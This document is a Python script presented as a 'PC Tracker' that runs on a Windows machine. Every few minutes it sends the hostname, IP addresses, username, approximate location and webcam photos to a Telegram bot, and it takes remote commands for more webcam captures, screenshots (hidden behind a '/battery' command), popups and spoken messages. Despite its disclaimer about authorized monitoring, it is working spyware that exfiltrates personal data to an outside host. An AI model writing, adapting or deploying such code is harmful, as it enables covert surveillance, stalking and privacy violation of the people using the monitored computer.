# ------------------------------------------------------------
# 🖥️ PC Tracker Script by meowmet
# GitHub: https://github.com/meowmet
# Description:
#   - Sends system info, IP addresses, and webcam photos to Telegram.
#   - Accepts Telegram commands to perform remote tasks.
#   - Designed for educational and authorized monitoring purposes only.
# ------------------------------------------------------------


import requests
import socket
import platform
import os
import subprocess
import ctypes
import threading
from datetime import datetime
import cv2
import time
import logging

# ↓ YOUR CONFIG ↓
TELEGRAM_BOT_TOKEN = 'your_bot_token'
TELEGRAM_CHAT_ID   = 'your_chat_id'
PHOTO_INTERVAL          = 300  # seconds (5 min)
COMMAND_CHECK_INTERVAL  =   5  # seconds

API = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}'
logging.basicConfig(
    filename="pc_tracker_debug.log",
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)


def get_system_info():
    try:
        hn = socket.gethostname()
        lip = socket.gethostbyname(hn)
        try:
            pip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            pip = "N/A"
        return {
            'Time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'Hostname': hn,
            'Local IP': lip,
            'Public IP': pip,
            'Operating System': f"{platform.system()} {platform.release()}",
            'Processor': platform.processor(),
            'Username': os.getlogin()
        }
    except Exception as e:
        logging.error(f"System Info Error: {e}")
        return {'Error': str(e)}


def get_location():
    try:
        r = requests.get('http://ip-api.com/json', timeout=5).json()
        if r.get('status') == 'success':
            return {
                'Address': f"{r.get('city','Unknown')}, {r.get('country','Unknown')}",
                'City': r.get('city','Unknown'),
                'Country': r.get('countryCode','Unknown'),
                'Latitude': r.get('lat',0),
                'Longitude': r.get('lon',0)
            }
    except Exception as e:
        logging.error(f"Location Error: {e}")
    return {'Location': 'Unable to determine location'}


def capture_webcam():
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return None
        ret, frame = cam.read()
        cam.release()
        if ret:
            fn = "webcam_capture.jpg"
            cv2.imwrite(fn, frame)
            return fn
    except Exception as e:
        logging.error(f"Webcam Error: {e}")
    return None


def send_telegram_message(txt):
    try:
        requests.post(f"{API}/sendMessage",
                      data={'chat_id': TELEGRAM_CHAT_ID,
                            'text': txt,
                            'parse_mode': 'HTML'},
                      timeout=10)
    except Exception as e:
        logging.error(f"SendMsg Error: {e}")


def send_telegram_photo(path):
    try:
        with open(path, 'rb') as f:
            requests.post(f"{API}/sendPhoto",
                          files={'photo': f},
                          data={'chat_id': TELEGRAM_CHAT_ID},
                          timeout=10)
        os.remove(path)
    except Exception as e:
        logging.error(f"SendPhoto Error: {e}")


def format_system_info(info):
    s = "<b>🖥️ PC Tracking Information</b>\n"
    s += f"⏰ <b>Time:</b> {info['Time']}\n"
    s += f"🏷️ <b>Hostname:</b> {info['Hostname']}\n"
    s += f"🏠 <b>Local IP:</b> {info['Local IP']}\n"
    s += f"🌍 <b>Public IP:</b> {info['Public IP']}\n"
    s += f"💻 <b>Operating System:</b> {info['Operating System']}\n"
    s += f"👤 <b>Username:</b> {info['Username']}\n"
    return s


def format_location_info(loc):
    if 'Address' in loc:
        link = f"https://maps.google.com/?q={loc['Latitude']},{loc['Longitude']}"
        return (
            "📍 <b>Location Detected:</b>\n"
            f"🏠 <b>Address:</b> {loc['Address']}\n"
            f"🏙️ <b>City:</b> {loc['City']}\n"
            f"🌐 <b>Country:</b> {loc['Country']}\n"
            f"🗺️ <b>Coordinates:</b> {loc['Latitude']}, {loc['Longitude']}\n"
            f"🔗 <a href='{link}'>Open in Google Maps</a>"
        )
    return "⚠️ <b>Unable to determine location</b>"


def speak_text(text):
    try:
        vbs = f'''
        Dim sp
        Set sp=CreateObject("SAPI.SpVoice")
        sp.Speak "{text}"
        '''
        with open("tts.vbs","w") as f:
            f.write(vbs)
        subprocess.run(["cscript","//nologo","tts.vbs"], shell=True)
        os.remove("tts.vbs")
    except Exception as e:
        logging.error(f"TTS Error: {e}")


def handle_command(cmd):
    try:
        if cmd.startswith("/alarm"):
            msg = cmd[6:].strip()
            if msg:
                # popup + TTS
                threading.Thread(target=ctypes.windll.user32.MessageBoxW,
                                 args=(0, msg, "Alarm", 0x40),
                                 daemon=True).start()
                threading.Thread(target=speak_text,
                                 args=(msg,),
                                 daemon=True).start()

        elif cmd.startswith("/warning"):
            msg = cmd[8:].strip()
            if msg:
                # only TTS, no popup
                threading.Thread(target=speak_text,
                                 args=(msg,),
                                 daemon=True).start()

        elif cmd.startswith("/cam"):
            pic = capture_webcam()
            if pic:
                send_telegram_photo(pic)

        elif cmd.startswith("/specs"):
            info = get_system_info()
            if 'Error' not in info:
                txt = (
                    f"Hostname: {info['Hostname']}\n"
                    f"OS: {info['Operating System']}\n"
                    f"CPU: {info['Processor']}"
                )
                send_telegram_message(txt)

        elif cmd.startswith("/ip"):
            info = get_system_info()
            if 'Error' not in info:
                send_telegram_message(
                    f"Local IP: {info['Local IP']}\nPublic IP: {info['Public IP']}"
                )

        elif cmd.startswith("/location"):
            loc = get_location()
            send_telegram_message(format_location_info(loc))

        elif cmd.startswith("/user"):
            info = get_system_info()
            if 'Error' not in info:
                send_telegram_message(f"Username: {info['Username']}")

        elif cmd.startswith("/battery"):
            # using screenshot for “battery” command
            try:
                import pyautogui
                path="screenshot.png"
                pyautogui.screenshot(path)
                send_telegram_photo(path)
            except Exception as e:
                logging.error(f"Screenshot Error: {e}")
                send_telegram_message("Failed to take screenshot")

        elif cmd.startswith("/allinfo"):
            info = get_system_info()
            loc  = get_location()
            if 'Error' not in info:
                send_telegram_message(format_system_info(info))
                send_telegram_message(format_location_info(loc))

    except Exception as e:
        logging.error(f"HandleCmd Error: {e}")


def fetch_last_update():
    try:
        r = requests.get(f"{API}/getUpdates", timeout=10).json()
        if r.get('result'):
            last = r['result'][-1]
            return last['message']['text'], last['update_id']
    except Exception as e:
        logging.error(f"FetchUpd Error: {e}")
    return "", 0


def main():
    send_telegram_message("🔔 PC Tracking Script activated")
    last_photo = time.time()
    last_upd = 0

    while True:
        try:
            # every 5 min: info + loc + photo
            if time.time() - last_photo >= PHOTO_INTERVAL:
                si = get_system_info()
                if 'Error' not in si:
                    send_telegram_message(format_system_info(si))
                    send_telegram_message(format_location_info(get_location()))
                    pic = capture_webcam()
                    if pic:
                        send_telegram_photo(pic)
                last_photo = time.time()

            # check new command
            txt, uid = fetch_last_update()
            if uid > last_upd:
                handle_command(txt)
                last_upd = uid

            time.sleep(COMMAND_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"MainLoop Error: {e}")
            time.sleep(10)


if __name__ == "__main__":
    main()

